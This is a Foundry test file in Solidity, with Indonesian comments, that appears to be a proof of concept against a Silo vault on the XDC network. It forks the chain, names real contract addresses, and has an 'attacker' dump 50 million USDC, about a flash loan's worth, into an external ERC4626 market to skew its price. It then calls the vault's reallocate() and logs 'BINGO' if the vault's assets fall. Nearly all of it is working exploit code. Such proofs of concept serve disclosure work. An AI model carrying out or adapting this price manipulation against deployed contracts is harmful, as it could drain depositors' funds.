// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {IERC20} from "openzeppelin5/token/ERC20/IERC20.sol";
import {IERC4626} from "openzeppelin5/interfaces/IERC4626.sol";

interface ISiloVault is IERC4626 {
    struct MarketAllocation {
        IERC4626 market;
        uint256 assets;
    }
    function reallocate(MarketAllocation[] calldata allocations) external;
}

contract SiloXDCRealisticForkTest is Test {
    string XDC_RPC_URL = "https://erpc.xinfin.network/"; 
    
    address constant USDC = 0xfA2958CB79b0491CC627c1557F441eF849Ca8eb1;
    address constant SILO_VAULT = 0x06083Db34F1E915FA5cd4e2A198f3680E3CE9c60; 
    address constant EXTERNAL_MARKET = 0xB38658B163E364DfFFDBC895f1b5d658d5e6C439; 
    address constant SOURCE_MARKET = 0xd1ed56Ed95c02634D9e2385A04cd5b97078dd932; 
    
    address constant ALLOCATOR = 0x8e65743e23Ed13f593E7d4eb7ED3ddE1E1cB9bBf; 

    function setUp() public {
        uint256 forkId = vm.createFork(XDC_RPC_URL);
        vm.selectFork(forkId);
    }

    function test_ProveSlippageLoss() public {
        address attacker = address(0xBAD);
        uint256 flashLoanAmount = 50_000_000 * 1e6; // 50 Juta USDC
        deal(USDC, attacker, flashLoanAmount); 

        // ==========================================================
        // 1. MANIPULASI HARGA EXTERNAL MARKET
        // ==========================================================
        vm.startPrank(attacker);
        IERC20(USDC).transfer(EXTERNAL_MARKET, flashLoanAmount);
        vm.stopPrank();

        // KITA CATAT TVL VAULT SETELAH HARGA DIRUSAK
        // Uang Vault memang seolah naik (karena Vault punya saham di sana), 
        // tapi fokus kita adalah proses "Reallocate" di bawah ini.
        uint256 vaultTVLBeforeRealloc = IERC4626(SILO_VAULT).totalAssets();
        console.log("TVL Vault Sebelum Reallocate :", vaultTVLBeforeRealloc);

        // ==========================================================
        // 2. EKSEKUSI VAULT: Pindahkan 1,000 USDC antar Kantong
        // ==========================================================
        vm.startPrank(ALLOCATOR);
        ISiloVault.MarketAllocation[] memory allocations = new ISiloVault.MarketAllocation[](2);
        
        uint256 sourceShares = IERC20(SOURCE_MARKET).balanceOf(SILO_VAULT);
        uint256 currentSupplyAssets = IERC4626(SOURCE_MARKET).convertToAssets(sourceShares);
        uint256 targetMoveAmount = 1_000 * 1e6; // 1000 USDC
        
        // Kantong Kiri (Tarik 1000)
        allocations[0] = ISiloVault.MarketAllocation({
            market: IERC4626(SOURCE_MARKET),
            assets: currentSupplyAssets - targetMoveAmount 
        });
        // Kantong Kanan (Setor 1000)
        allocations[1] = ISiloVault.MarketAllocation({
            market: IERC4626(EXTERNAL_MARKET),
            assets: type(uint256).max 
        });
        
        // Fungsi ini akan mengeksekusi perpindahan dana
        ISiloVault(SILO_VAULT).reallocate(allocations);
        vm.stopPrank();

        // ==========================================================
        // 3. PEMBUKTIAN SLIPPAGE (KERUGIAN)
        // ==========================================================
        uint256 vaultTVLAfterRealloc = IERC4626(SILO_VAULT).totalAssets();
        console.log("TVL Vault Setelah Reallocate :", vaultTVLAfterRealloc);

        // Seharusnya, TVL tidak berubah saat kita sekadar memindahkan uang.
        // Tapi jika nilai TVL Turun, berarti 1000 USDC tadi hangus jadi debu!
        if (vaultTVLAfterRealloc < vaultTVLBeforeRealloc) {
            console.log("\n[+] BINGO! BUKTI SLIPPAGE LOSS VALID!");
            console.log("[+] Vault kehilangan dana sebesar:", vaultTVLBeforeRealloc - vaultTVLAfterRealloc, "USDC (Hangus di udara)!");
            console.log("[+] Bukti konkret bahwa fungsi reallocate() MENHANCURKAN UANG VAULT saat market sedang dimanipulasi.");
        } else {
            console.log("\n[-] Eksploitasi gagal.");
        }
    }
}
